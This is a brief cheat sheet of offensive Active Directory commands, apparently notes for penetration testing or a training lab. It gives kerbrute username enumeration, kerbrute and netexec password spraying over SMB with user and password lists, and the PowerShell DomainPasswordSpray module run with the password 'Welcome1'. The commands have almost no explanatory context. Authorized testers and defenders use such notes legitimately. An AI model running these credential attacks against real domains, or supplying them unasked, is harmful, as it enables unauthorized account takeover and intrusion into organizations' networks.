Kerbrute username enumeration ([T1087.002](https://attack.mitre.org/techniques/T1087))
```bash
kerbrute userenum --dc <IP> --domain <DOMAIN> <USERFILE>
```
## Linux
- nxc
```bash
nxc smb targets.txt -u domain_users.txt -p domain_pass.txt --continue-on-success
nxc smb targets.txt -u domain_users.txt -p domain_pass.txt --continue-on-success --local-auth
```
- Kerbrute
```shell-session
kerbrute bruteuser -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
```
## Windows
- Kerbrute
- DomainPasswordSpray.ps1
```powershell-session
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

